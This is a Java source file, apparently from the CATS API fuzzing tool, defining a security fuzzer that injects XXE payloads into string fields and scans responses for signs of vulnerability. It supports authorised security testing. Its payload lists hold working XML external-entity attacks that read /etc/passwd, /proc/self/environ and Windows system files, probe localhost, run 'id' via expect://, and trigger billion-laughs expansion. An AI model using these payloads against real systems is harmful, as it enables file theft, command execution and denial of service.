package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.List;
import java.util.Locale;

/**
 * Fuzzer that sends XXE injection payloads in string fields.
 * Targets fields that may be processed as XML downstream, even if the API accepts JSON.
 */
@Singleton
@FieldFuzzer
public class XxeInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {
    private static final List<String> FIELDS = List.of("xml", "content", "data", "payload", "message", "body", "text", "input", "document", "template");

    private static final List<String> TOP_PAYLOADS = List.of(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY test \"XXE_TEST_SUCCESS\">]><foo>&test;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hostname\"> %xxe;]><foo>test</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>"
    );

    private static final List<String> ALL_PAYLOADS = List.of(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY test \"XXE_TEST_SUCCESS_8051\">]><foo>&test;</foo>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY test \"XXE_MARKER_6497\">]><root>&test;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hostname\"> %xxe;]><foo>test</foo>",
            "<!DOCTYPE foo [<!ENTITY % param SYSTEM \"file:///etc/passwd\"> %param; <!ENTITY test \"&param;\">]><foo>&test;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:8080/\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;&lol2;&lol2;</lolz>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo><![CDATA[&xxe;]]></foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"AAA\"><!ENTITY b \"&a;&a;\"><!ENTITY c \"&b;&b;\">]><foo>&c;</foo>"
    );

    private static final List<String> XXE_ERROR_KEYWORDS = List.of(
            // XML parsing errors
            "xml parsing error",
            "xml parse error",
            "saxparseexception",
            "saxreader",
            "documentbuilder",
            "xmlstreamexception",
            "xmlreader",

            // Entity-related errors
            "entity",
            "external entity",
            "doctype",
            "dtd",

            // Syntax errors
            "unexpected token",
            "content is not allowed in prolog",
            "premature end of file",
            "malformed",
            "invalid xml",

            // Security errors
            "access denied",
            "permission denied",
            "security",
            "prohibited",
            "blocked",
            "entity expansion",

            // Parser-specific errors
            "jaxp",
            "xerces",
            "libxml",
            "msxml",

            // File system errors (might indicate attempted file access)
            "file not found",
            "no such file",
            "cannot access"
    );

    private static final List<String> XXE_SUCCESS_MARKERS = List.of(
            "xxe_test_success_8051",
            "xxe_marker_6497",
            "xxe_test_success",

            // Unix file indicators
            "root:x:0:0:",           // /etc/passwd
            "daemon:x:",             // /etc/passwd
            "bin:x:",                // /etc/passwd
            "localhost",             // /etc/hostname might return this

            // Windows file indicators
            "[fonts]",               // win.ini
            "[extensions]",          // win.ini
            "[mci extensions]",      // win.ini
            "# copyright",           // hosts file

            // Process/environment indicators
            "path=",                 // environment variables
            "home=",                 // environment variables
            "java_home=",            // environment variables

            // Entity expansion success
            "lollollol",            // billion laughs
            "aaaaaa"                // repeated entity expansion
    );

    public XxeInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener, SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "XXE";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_PAYLOADS;
    }

    @Override
    public String description() {
        return "iterate through each string field and send XXE injection payloads to detect XML External Entity vulnerabilities";
    }

    @Override
    protected boolean shouldFuzzField(String fieldName) {
        String lowerCaseField = fieldName.toLowerCase(Locale.ROOT);
        return FIELDS.stream().anyMatch(lowerCaseField::contains);
    }

    @Override
    protected InjectionDetectionResult detectInjectionEvidence(CatsResponse response, FuzzingData data) {
        String responseBody = response.getBody();
        String responseLower = responseBody.toLowerCase(Locale.ROOT);

        for (String marker : XXE_SUCCESS_MARKERS) {
            if (responseLower.contains(marker)) {
                return InjectionDetectionResult.vulnerable(
                        "XXE vulnerability detected",
                        "Response contains evidence of successful entity expansion: '" + marker + "'"
                );
            }
        }

        for (String keyword : XXE_ERROR_KEYWORDS) {
            if (responseLower.contains(keyword)) {
                return InjectionDetectionResult.vulnerable(
                        "Potential XXE vulnerability detected",
                        "Response contains XML parsing error: '" + keyword + "'. " +
                                "This indicates the backend processes XML, which may be exploitable."
                );
            }
        }

        if (responseBody.length() > 100000 && containsRepeatedPatterns(responseBody)) {
            return InjectionDetectionResult.vulnerable(
                    "Potential XXE DoS vulnerability detected",
                    "Response is unusually large with repeated patterns, suggesting entity expansion attack succeeded"
            );
        }

        return InjectionDetectionResult.notVulnerable();
    }

    /**
     * Checks if the response contains repeated patterns that might indicate
     * successful entity expansion (billion laughs attack).
     */
    private boolean containsRepeatedPatterns(String response) {
        if (response.length() < 100) {
            return false;
        }
        String responseLower = response.toLowerCase(Locale.ROOT);

        String[] patterns = {"lol", "aaa", "test", "xxx"};
        for (String pattern : patterns) {
            int count = countOccurrences(responseLower, pattern);
            if (count > 20) {
                return true;
            }
        }

        return false;
    }

    private int countOccurrences(String str, String pattern) {
        int count = 0;
        int index = 0;
        while ((index = str.indexOf(pattern, index)) != -1) {
            count++;
            index += pattern.length();
        }
        return count;
    }
}